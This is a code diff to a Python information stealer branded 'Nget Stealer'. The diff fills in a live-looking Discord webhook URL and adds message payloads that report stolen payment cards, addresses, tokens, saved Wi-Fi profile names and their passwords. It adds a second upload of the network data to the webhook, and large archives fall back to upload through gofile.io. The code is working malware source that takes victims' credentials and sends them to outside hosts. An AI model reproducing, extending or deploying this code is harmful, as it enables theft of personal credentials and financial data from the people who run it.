@@ -7,7 +7,7 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 config = {
-    'webhook': "WEBHOOKHERE",  
+    'webhook': "https://discord.com/api/webhooks/1182948273909137459/sy4h9XpUZFPstS21de9jdqXyaJ_sOLkym7kDarTl4qnRtGpFHWXoAgjVDlaX07WdiDae",  
     'hideconsole': True, 
     'antivm': False,  
     'force_admin': False, 
@@ -630,6 +630,36 @@ Antivirus: {avlist}
                                                    f'<a:dancingblob:873253607749857280> Cards Found: {self.stats["cards"]}\n'
                                                    f'<a:dancingblob:873253607749857280> Addresses Found: {self.stats["addresses"]}\n'
                                                    f'<a:dancingblob:873253607749857280> Tokens Found: {self.stats["tokens"]}\n'
+                                                   f'<a:dancingblob:873253607749857280> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
+                                    "inline": False,
+                                    "color": 0x00000,
+                                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
+                                    "thumbnail": {
+                                        "url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                    },
+                                    "footer": {
+                                        "text": "Nget Stealer",
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                    }
+                                }
+                            ]
+                        }         
+        fileEmbed = {
+            "username": f"{os.getlogin()} | Nget",
+            "avatar_url":"https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+        }
+        Network = {
+                    "username": f"Nget Network Stealer",
+                    "content": "@everyone",
+                    "avatar_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&",
+                    "embeds": [
+                                {
+                                    "author": {
+                                        "name": "Nget Stealer",
+                                        "url": "",
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                    },
+                                    "description": f'**{os.getlogin()}** ran Nget Stealer.\n\n'
                                                    f'<a:dancingblob:873253607749857280> **Net Profile Names:** ```{profile_names}```\n'
                                                    f'<a:dancingblob:873253607749857280> **Network Info** ```{profile_info}```\n'
                                                    f'<a:dancingblob:873253607749857280> **Currently Connected** ```{profile}\n{profile_password}```\n'
@@ -653,6 +683,7 @@ Antivirus: {avlist}
         }
         with open(_zipfile,'rb') as infozip:
             requests.post(self.webhook, json=embed)
+            requests.post(self.webhook, json=Network)
             if requests.post(self.webhook, data=fileEmbed, files={'upload_file': infozip}).status_code == 413:
                 infozip.seek(0)
                 server = requests.get('https://api.gofile.io/getServer').json()['data']['server']
